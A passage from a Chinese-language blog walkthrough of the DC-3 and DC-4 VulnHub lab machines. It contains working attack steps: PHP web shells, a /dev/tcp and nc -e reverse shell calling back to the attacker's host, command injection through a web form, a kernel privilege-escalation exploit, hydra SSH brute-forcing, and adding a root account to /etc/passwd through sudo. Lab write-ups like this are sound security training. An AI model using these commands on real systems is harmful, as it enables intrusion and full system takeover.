<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">set</span> LHOST <span class="comment">192.168.133.140</span>  //<span class="comment">kali</span>的<span class="comment">ip</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">run</span>，运行</span><br></pre></td></tr></table></figure></div>

<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903223440029.png" alt="image-20220903223440029"></p>
<p>然后输入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">shell</span></span><br><span class="line"></span><br><span class="line">然后输入<span class="keyword">python</span> -<span class="keyword">c</span> <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">//进入交互式<span class="keyword">shell</span>，当然不嫌看着麻烦，也可以直接执行后面命令</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903223812256.png" alt="image-20220903223812256"></p>
<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span>,简单看看文件</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903224116654.png" alt="image-20220903224116654"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">uname</span> -a</span><br><span class="line">查看系统版本</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904082811177.png" alt="image-20220904082811177"></p>
<p>看到unbuntu是2016年4月发布的，所以是unbuntu16.04</p>
<p>linux版本是4.4.0-21版</p>
<p>所以根据这个版本看看有没有可以利用的漏洞，来方便我们提权</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">还是利用之前用过的</span><br><span class="line">searchsploit unbuntu 16.04</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220904093243588.png" alt="image-20220904093243588"></p>
<p><strong>double-fdput()</strong> ,这是运行可执行文件，即可获取root权限</p>
<p>我们把它内容显示出来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入searchsploit -p <span class="number">39772</span>显示文本路径</span><br><span class="line">   cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local/<span class="number">39772</span>.txt 显示内容</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904093849189.png" alt="image-20220904093849189"></p>
<p>在最后看到该漏洞利用的exp下载链接</p>
<p><img src="/2022/08/29/vulnhub/image-20220904095521748.png" alt="image-20220904095521748"></p>
<p>下载最后一个链接的压缩包</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="regexp">/raw/m</span>aster<span class="regexp">/bin-sploits/</span><span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure></div>

<p>然后在我们的网站后台上传上去，和创建木马文件时候一样</p>
<p><img src="/2022/08/29/vulnhub/image-20220904101055473.png" alt="image-20220904101055473"></p>
<p>结果报错了</p>
<p><img src="/2022/08/29/vulnhub/image-20220904101159692.png" alt="image-20220904101159692"></p>
<p>看来这个网站上传处是不能上传压缩包文件的</p>
<p>所以我们只能用工具进行直接上传了，比如蚁剑或者菜刀等工具</p>
<p>我们和之前一样新建一个php文件写上我们的一句话木马</p>
<p><img src="/2022/08/29/vulnhub/image-20220904101711601.png" alt="image-20220904101711601"></p>
<p>用蚁剑连接</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">123</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904101700569.png" alt="image-20220904101700569"></p>
<p>然后把我们的压缩包放在目录下</p>
<p><img src="/2022/08/29/vulnhub/image-20220904112832628.png" alt="image-20220904112832628"></p>
<p>然后返回msf</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904112929091.png" alt="image-20220904112929091"></p>
<p>发现压缩包已经在里面了</p>
<p>然后解压缩</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">输入unzip <span class="number">39772.</span><span class="built_in">zip</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904113114803.png" alt="image-20220904113114803"></p>
<p>发现目录下多了个<code>39772</code>的目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> 39772</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904113213562.png" alt="image-20220904113213562"></p>
<p>发现有两个压缩包，我们利用<code>exploit.tar</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入tar -xvf exploit.tar <span class="regexp">//</span>解压缩</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904113439714.png" alt="image-20220904113439714"></p>
<p>发现多了个<code>ebpf_mapfd_doubleput_exploit</code>目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904113541560.png" alt="image-20220904113541560"></p>
<p>发现有个<code>compile.sh</code></p>
<p>运行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入./compile.sh</span><br></pre></td></tr></table></figure></div>

<p>发现目录下有多了一个<code>doubleput</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220904113730537.png" alt="image-20220904113730537"></p>
<p>这就是提权文件，运行一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入./doupleput</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904114028987.png" alt="image-20220904114028987"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span>，看看提权成功没</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904114119370.png" alt="image-20220904114119370"></p>
<p>提权成功</p>
<p>然后我们到/root目录下查看 flag</p>
<p><img src="/2022/08/29/vulnhub/image-20220904114212223.png" alt="image-20220904114212223"></p>
<hr>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line"> \ \      / /__|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \  ___  _ __   ___</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">  \ \ /\ / / _ \ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">   \ V  V /  __/ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|</span><br><span class="line">    \_/\_/ \___|<span class="string">_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">____/ \___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___(_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you&#x27;ve enjoyed this challenge as I enjoyed making it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If there are any ways that I can improve these little challenges,</span></span><br><span class="line"><span class="string">please let me know.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Have a great day!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">意思是：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">恭喜你，一切正常。：-）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">我希望你和我一样喜欢这个挑战。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果有任何方法可以改善这些小挑战，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">请让我知道。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如往常一样，评论和投诉可以通过Twitter发送到@DCAU7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">祝你有美好的一天！！！！ </span></span><br></pre></td></tr></table></figure></div>

<p><strong>一个旗子找完，游戏结束</strong></p>
<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line">反弹<span class="keyword">shell</span><span class="language-bash">，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</span></span><br><span class="line"></span><br><span class="line">通俗点说，反弹<span class="keyword">shell</span><span class="language-bash">就是一种反向链接，与正向的ssh等不同，它是在对方电脑执行命令连接到我方的攻击模式，并且这种攻击模式必须搭配远程执行命令漏洞来使用。</span></span><br><span class="line"></span><br><span class="line">由于防火墙等限制，对方机器只能发送请求，不能接收请求</span><br><span class="line"></span><br><span class="line">对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，建立一个服务端，让恶意程序主动连接，才是上策。</span><br></pre></td></tr></table></figure></div>

<p>和法一一样，我们需要写一个反弹shell的php文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#x27;&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意这里的ip为kali的ip，8888为监听的端口</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904115013063.png" alt="image-20220904115013063"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入nc -lnvp <span class="number">8888</span>开始监听</span><br><span class="line">然后访问<span class="number">456</span>.php</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">456</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904130847588.png" alt="image-20220904130847588"></p>
<p>拿到shell，后面提权和法一</p>
<p>一样</p>
<h3 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h3><h4 id="weevely【提权没回显】"><a href="#weevely【提权没回显】" class="headerlink" title="weevely【提权没回显】"></a><strong>weevely</strong>【提权没回显】</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Weevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c/s模式 构建,可以算作是linux下的一款php菜刀替代工具</span><br></pre></td></tr></table></figure></div>

<p>生成Shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VERILOG"><figure class="iseeu highlight /verilog"><table><tr><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;文件名&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure></div>

<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>
<p>利用触发shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904133118746.png" alt="image-20220904133118746"></p>
<p>成功进入shell</p>
<p>但是当执行提权时</p>
<p><img src="/2022/08/29/vulnhub/image-20220904135935922.png" alt="image-20220904135935922"></p>
<p>报错无法提权，看来是被过滤啥的</p>
<hr>
<h1 id="四、DC-4-初级-中级"><a href="#四、DC-4-初级-中级" class="headerlink" title="四、DC-4[初级/中级]"></a>四、DC-4[初级/中级]</h1><p><strong>only one flag</strong></p>
<p>先看看靶机端口运行的服务</p>
<p><img src="/2022/08/29/vulnhub/image-20220918190610478.png" alt="image-20220918190610478"></p>
<p>发现有22和80端口，分别运行ssh和http</p>
<p>我们先访问80端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="code"><pre><span class="line">访问<span class="built_in">ip</span>：<span class="number">192</span>.<span class="number">168</span>.<span class="number">133</span>.<span class="number">141</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918190945726.png" alt="image-20220918190945726"></p>
<p>是一个基本的登录窗口，有提示是admin用户登录界面，所以<strong>可能需要密码爆破登录</strong></p>
<p>我们再利用<code>wappalyzer</code>看一下网站一些基本信息</p>
<p><img src="/2022/08/29/vulnhub/image-20220918194402321.png" alt="image-20220918194402321"></p>
<p>没有啥有用的信息</p>
<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>然后我们就开始进行密码爆破</p>
<p>已知用户名为admin，只用对密码爆破</p>
<p><img src="/2022/08/29/vulnhub/image-20220918202233098.png" alt="image-20220918202233098"></p>
<p>【字典可以自己找，当然也可以看我学习笔记写的网站下载】</p>
<p>这里我用的<code>top2000.txt</code></p>
<p>最后爆破出密码为<code>happy</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220918203225520.png" alt="image-20220918203225520"></p>
<p>登录试试</p>
<p><img src="/2022/08/29/vulnhub/image-20220918204147349.png" alt="image-20220918204147349"></p>
<p>登录成功，进入<code>Command</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220918204230810.png" alt="image-20220918204230810"></p>
<p>点击run，就会显示上面的数据，看来是命令执行，但是它默认是<code>ls -l</code>，我们试试抓包能修改请求包里的命令吗</p>
<p><img src="/2022/08/29/vulnhub/image-20220918204413877.png" alt="image-20220918204413877"></p>
<p>发现是可以修改的，我们试试<code>whoami</code>命令，看看当前网站登录用户权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918204514149.png" alt="image-20220918204514149"></p>
<p>发现是普通用户权限</p>
<hr>
<p>后续查询操作，因为我们可以执行命令，所以也可以利用nc<strong>反弹shell</strong>，同样也可以找到用户目录信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">终端输入nc -l -vv -<span class="selector-tag">p</span> <span class="number">8888</span>，监听<span class="number">8888</span>端口</span><br></pre></td></tr></table></figure></div>

<p>抓包数据命令修改为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -nv <span class="number">192.168.133.140</span> <span class="number">8888</span> -e /bin/bash   //<span class="number">192</span>.<span class="number">168</span>.<span class="number">133</span>是虚拟机ip，不是靶机ip</span><br></pre></td></tr></table></figure></div>

<p>然后终端就可以执行后续执行命令的类似操作，就是执行的时候可能稍微方便一些</p>
<hr>
<p>我们修改命令，查询<code>/etc/passwd</code>文档（记录每个用户的信息，方便管理员对用户的管理的一个文档）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">输入cat+<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918205535912.png" alt="image-20220918205535912"></p>
<p>发现有三个用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">charles</span></span><br><span class="line"><span class="attribute">jim</span></span><br><span class="line"><span class="attribute">sam</span></span><br></pre></td></tr></table></figure></div>

<p>我们查看这几个用户的目录下有没有我们需要的信息</p>
<p>先访问<code>charles</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">输入ls+-a+<span class="regexp">/home/</span>charles</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918211049263.png" alt="image-20220918211049263"></p>
<p>感觉没啥有用的信息</p>
<p>再看看<code>jim</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">输入ls+-a+<span class="regexp">/home/</span>jim</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918211159526.png" alt="image-20220918211159526"></p>
<p>发现关键信息， <code>backups</code>目录和<code>mbox</code>目录，<code>test.sh</code>里面我看了，没啥有用的信息</p>
<p>先看<code>backups</code>目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">输入ls+-a+<span class="regexp">/home/</span>jim/backups</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918211855793.png" alt="image-20220918211855793"></p>
<p>发现有个<code>old-passwords.bak</code>，这个可能就是登录这三个用户的关键</p>
<p>查看一下内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">输入cat+<span class="regexp">/home/</span>jim/old-passwords.bak</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918212107439.png" alt="image-20220918212107439"></p>
<p>发现是一个密码表，复制到一个文本文件，当作爆破的密码表</p>
<h2 id="hydra对三用户进行ssh爆破"><a href="#hydra对三用户进行ssh爆破" class="headerlink" title="hydra对三用户进行ssh爆破"></a>hydra对三用户进行ssh爆破</h2><p>我们已经有了密码表<code>（pd.txt）</code>,我们再把三个用户名写到另一个文档里<code>（un.txt）</code></p>
<p>因为之前我们扫描知道，<code>22</code>端口运行着<code>ssh</code>，而<code>80</code>端口我们已经访问了，所以下面端口写<code>22</code></p>
<p>于是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">输入hydra -L un<span class="selector-class">.txt</span> -P pd<span class="selector-class">.txt</span> <span class="number">192.168</span>.<span class="number">133.141</span> ssh -s <span class="number">22</span></span><br></pre></td></tr></table></figure></div>

<p>有点久，等一会就行</p>
<p><img src="/2022/08/29/vulnhub/image-20220918214254623.png" alt="image-20220918214254623"></p>
<p>得到<code>jim</code>用户的密码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">jibril04</span><br></pre></td></tr></table></figure>



<p>然后我们登录ssh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">jim@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.141</span> -p <span class="number">22</span></span><br></pre></td></tr></table></figure></div>

<p>然后输入密码后，登录成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220918214519470.png" alt="image-20220918214519470"></p>
<p>我们先看看我们能否执行一些管理员命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输入sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220918215754640.png" alt="image-20220918215754640"></p>
<p>发现<code>jim</code>用户不能执行任何管理员命令，所以不可能在<code>jim</code>用户上进行提权或其他后续操作</p>
<p>我们仔细一些可以看到</p>
<p><img src="/2022/08/29/vulnhub/image-20220918214603182.png" alt="image-20220918214603182"></p>
<p>说我们有一封邮件，那我们就看看这封用邮件是什么</p>
<p>但我们不知道<code>mail</code>在哪里</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">find</span> / -name mail</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918215012745.png" alt="image-20220918215012745"></p>
<p>找到位置<code>/var/mail</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> /var/mail;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918215052934.png" alt="image-20220918215052934"></p>
<p>发现有一封名为<code>jim</code>的邮件，查看信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cat</span> jim</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918215204901.png" alt="image-20220918215204901"></p>
<p>发现是<code>charles</code>发给<code>jim</code>的邮件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off <span class="keyword">on</span> holidays <span class="keyword">at</span> <span class="keyword">the</span> <span class="keyword">end</span> <span class="keyword">of</span> today, so <span class="keyword">the</span> boss asked <span class="keyword">me</span> <span class="keyword">to</span> give you <span class="keyword">my</span> password just <span class="keyword">in</span> case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password <span class="keyword">is</span>:  ^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br><span class="line"></span><br><span class="line">翻译：</span><br><span class="line">嗨，吉姆，</span><br><span class="line"></span><br><span class="line">我今天年底要放假，所以老板让我把密码给你，以防万一。</span><br><span class="line"></span><br><span class="line">密码是：^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">再见，</span><br><span class="line">查尔斯</span><br></pre></td></tr></table></figure></div>

<p>信里提到他自己的密码</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">^xHhA<span class="meta">&amp;hvim0y</span></span><br></pre></td></tr></table></figure>

<p>于是我们就可以登录<code>charles</code>的账号，所以我们切换用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">su</span> charles</span><br></pre></td></tr></table></figure></div>

<p>然后输入密码后，登录成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220918215532470.png" alt="image-20220918215532470"></p>
<p>先看看<code>charles</code>能执行什么管理员命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输入sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220918220005178.png" alt="image-20220918220005178"></p>
<p>发现<code>charles</code>可以执行管理员的<code>teehee</code>命令</p>
<h2 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h2><p>我们先需要知道这个命令是干什么的</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输入teehee -h</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220918220336958.png" alt="image-20220918220336958"></p>
<p><u><strong>发现它是可以修改文件的数据，-a指令能够保证修改文件不会覆盖原有文件</strong></u></p>
<p>那我们需要管理员权限，就可以在<code>/etc/passwd</code>里面添加一个管理员用户数据</p>
<h3 id="添加管理员账户"><a href="#添加管理员账户" class="headerlink" title="添加管理员账户"></a>添加管理员账户</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入sudo teehee -a <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure></div>

